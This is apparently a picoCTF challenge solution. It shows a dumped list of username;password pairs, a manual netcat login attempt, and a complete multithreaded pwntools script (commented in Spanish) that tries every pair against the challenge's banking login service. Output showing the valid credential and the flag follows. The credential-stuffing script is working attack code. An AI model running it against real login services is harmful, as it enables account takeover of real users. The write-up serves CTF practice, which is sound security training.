cat creds-dump.txt                                                                                                                                    ✔ 
rora;winner1
birendra;rumble
khalid;sting
stanislaw;ming
maged;nimrod
sigrid;telephon
alysse;sutton
emely;tyrant
cornel;rodman
shamira;marion
cymbre;california
[SNIP]....


 nc crystal-peak.picoctf.net 62879                                                                                                                    ✔ 

=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username: yo
yo
Password: yo
yo

Invalid username or password
                                                                                                                                                                            
Script
```
from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

HOST = 'crystal-peak.picoctf.net'
PORT = 62879  # Tu puerto activo actual
DICTIONARY = 'creds-dump.txt'
MAX_WORKERS = 4  # Bajamos hilos para no tumbar la instancia

context.log_level = 'error'

def probar_credencial(username, password, num_intento):
    try:
        r = remote(HOST, PORT, timeout=4)
        
        r.recvuntil(b"Username:", timeout=3)
        r.sendline(username.encode())
        
        r.recvuntil(b"Password:", timeout=3)
        r.sendline(password.encode())
        
        respuesta = r.recvall(timeout=3).decode(errors='ignore')
        r.close()
        
        # Validación estricta: Si está vacío o es un paquete fantasma por saturación, lo ignoramos
        if not respuesta or len(respuesta.strip()) <= 5:
            return {"encontrado": False, "intento": num_intento}
            
        # Si NO está el mensaje de error habitual, es una mina de oro
        if "Invalid username or password" not in respuesta:
            return {
                "encontrado": True, 
                "user": username, 
                "pass": password, 
                "data": respuesta
            }
            
    except Exception:
        pass
        
    return {"encontrado": False, "intento": num_intento}

def main():
    try:
        with open(DICTIONARY, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and ';' in line]
    except FileNotFoundError:
        print(f"[-] No se encontró {DICTIONARY}")
        sys.exit(1)

    print(f"[*] Lanzando ataque controlado con {MAX_WORKERS} hilos para {len(lines)} credenciales...\n")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futuros = []
        for idx, line in enumerate(lines, 1):
            username, password = line.split(';', 1)
            futuros.append(executor.submit(probar_credencial, username, password, idx))
        
        for futuro in as_completed(futuros):
            resultado = futuro.result()
            
            if resultado["encontrado"]:
                print("\n" + "="*50)
                print(f"[+] ¡CREDENCIALES VÁLIDAS REALES ENCONTRADAS!")
                print(f"[+] Usuario: {resultado['user']}")
                print(f"[+] Password: {resultado['pass']}")
                print("="*50)
                print("[*] Respuesta del servidor:\n")
                print(resultado["data"])
                print("="*50)
                executor.shutdown(wait=False, cancel_futures=True)
                return
            else:
                print(f"[*] Procesando... Intento #{resultado['intento']}/{len(lines)}", end='\r')

    print("\n[-] Fin del diccionario. Ninguna credencial fue válida.")

if __name__ == '__main__':
    main()
```


 Opening connection to crystal-peak.picoctf.net on port 62879: Done
[+] Receiving all data: Done (91B)00
[+] Receiving all data: Done (41B)
[*] Closed connection to crystal-peak.picoctf.net port 62879
[+] Opening connection to crystal-peak.picoctf.net on port 62879: Done

==================================================
[+] ¡CREDENCIALES VÁLIDAS REALES ENCONTRADAS!
[+] Usuario: lorrin
[+] Password: young1
==================================================
[*] Respuesta del servidor:

 young1

Authenticating...
Welcome lorrin!
picoCTF{d0nt_r3u5e_cr3d3nt1als_abfe1660}


==================================================
[*] Closed connection to crystal-peak.picoctf.net port 62879
[+] Receiving all data: Done (41B)
[*] Closed connection to crystal-peak.picoctf.net port 62879
[+] Receiving all data: Done (41B)
[+] Receiving all data: Done (41B)
[*] Closed connection to crystal-peak.picoctf.net port 62879
[*] Closed connection to crystal-peak.picoctf.net port 62879
                              
